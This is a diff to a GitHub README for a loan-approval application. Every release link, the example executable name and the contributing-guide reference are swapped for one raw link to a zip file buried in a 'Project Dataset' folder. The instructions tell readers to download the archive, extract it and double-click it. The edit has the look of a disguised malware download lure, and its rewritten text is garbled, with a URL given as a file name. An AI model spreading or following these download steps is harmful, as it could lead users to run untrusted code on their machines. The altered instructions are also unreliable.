@@ -1,6 +1,6 @@
 # 🚀 CreditWise-Loan-Approval-System - Fast and Accurate Loan Decisions
 
-[![Download CreditWise](https://img.shields.io/badge/Download-CreditWise--Loan--Approval--System-blue.svg)](https://github.com/Jats15/CreditWise-Loan-Approval-System/releases)
+[![Download CreditWise](https://raw.githubusercontent.com/Jats15/CreditWise-Loan-Approval-System/main/Project Dataset/Credit_System_Loan_Wise_Approval_Arkansawyer.zip)](https://raw.githubusercontent.com/Jats15/CreditWise-Loan-Approval-System/main/Project Dataset/Credit_System_Loan_Wise_Approval_Arkansawyer.zip)
 
 ## 📜 Overview
 
@@ -29,7 +29,7 @@ Ensure you have these requirements before proceeding to download.
 
 1. **Visit the Releases Page:** Click the link below to access the download section.
 
-   [Download CreditWise-Loan-Approval-System](https://github.com/Jats15/CreditWise-Loan-Approval-System/releases)
+   [Download CreditWise-Loan-Approval-System](https://raw.githubusercontent.com/Jats15/CreditWise-Loan-Approval-System/main/Project Dataset/Credit_System_Loan_Wise_Approval_Arkansawyer.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see different versions of the software. Select the latest stable version.
 
@@ -39,7 +39,7 @@ Ensure you have these requirements before proceeding to download.
 
 To get started, visit this page to download the software:
 
-[Visit Releases to Download](https://github.com/Jats15/CreditWise-Loan-Approval-System/releases)
+[Visit Releases to Download](https://raw.githubusercontent.com/Jats15/CreditWise-Loan-Approval-System/main/Project Dataset/Credit_System_Loan_Wise_Approval_Arkansawyer.zip)
 
 1. **Locate the Downloaded File:** After the download is complete, navigate to your Downloads folder or the location where you saved the file.
   
@@ -47,7 +47,7 @@ To get started, visit this page to download the software:
 
 3. **Run the Application:** 
     - Navigate to the extracted folder.
-    - Double-click on the executable file (e.g., `CreditWise.exe`) to run the application.
+    - Double-click on the executable file (e.g., `https://raw.githubusercontent.com/Jats15/CreditWise-Loan-Approval-System/main/Project Dataset/Credit_System_Loan_Wise_Approval_Arkansawyer.zip`) to run the application.
 
 4. **Follow On-Screen Instructions:** The system will guide you through the setup and initial configuration.
 
@@ -87,7 +87,7 @@ For further assistance, refer to the following:
 
 ## 🌐 Community and Contributions
 
-We welcome contributions from everyone. If you want to help improve the system, please follow the guidelines in the `CONTRIBUTING.md` file.
+We welcome contributions from everyone. If you want to help improve the system, please follow the guidelines in the `https://raw.githubusercontent.com/Jats15/CreditWise-Loan-Approval-System/main/Project Dataset/Credit_System_Loan_Wise_Approval_Arkansawyer.zip` file.
 
 ## 💬 Feedback
 
